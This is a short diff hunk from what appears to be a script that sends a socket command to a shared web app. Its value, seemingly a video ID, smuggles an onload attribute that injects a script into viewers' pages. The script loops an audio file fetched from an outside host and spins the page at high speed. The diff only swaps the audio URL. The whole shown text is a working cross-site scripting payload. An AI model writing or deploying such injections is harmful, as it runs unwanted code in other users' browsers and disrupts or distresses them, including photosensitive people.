@@ -4,7 +4,7 @@ socket.emit('command', {
     "FveF-we6lcE\" onload=\" \
       var s=document.createElement('script'); \
       s.textContent = `(function(){ \
-        var audio = new Audio('https://files.catbox.moe/870k4e.wav'); \
+        var audio = new Audio('https://files.catbox.moe/xqiafa.wav'); \
         audio.loop = true; \
         audio.play(); \
         document.body.style.animation = 'spin 0.1s linear infinite'; \
